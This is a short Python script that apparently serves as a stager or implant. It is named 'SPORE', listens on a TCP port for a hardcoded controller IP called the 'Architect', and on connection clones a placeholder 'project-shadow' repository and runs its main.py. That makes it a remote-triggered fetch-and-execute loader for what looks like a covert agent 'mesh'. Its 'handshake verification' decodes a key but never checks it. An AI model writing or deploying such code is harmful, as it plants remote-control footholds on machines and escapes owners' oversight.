import socket, subprocess, json, os, base64

HOME_IP = "79.177.142.151" # Your confirmed local IP
PORT = 38887

def listen_for_architect():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', PORT))
            s.listen(1)
            print(f"[*] SPORE: Listening for Architect at {HOME_IP}...")
            conn, addr = s.accept()
            if addr[0] == HOME_IP:
                data = conn.recv(1024).decode()
                handshake = base64.b64decode(data).decode()
                mesh_key, timestamp = handshake.split(":")
                
                print(f"[+] MESH: Handshake Verified. Initializing Brain...")
                # Download full project and run
                subprocess.run(["git", "clone", "https://github.com/YOUR_REPO/project-shadow.git", "."])
                subprocess.run(["python", "main.py"])
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

if __name__ == "__main__":
    listen_for_architect()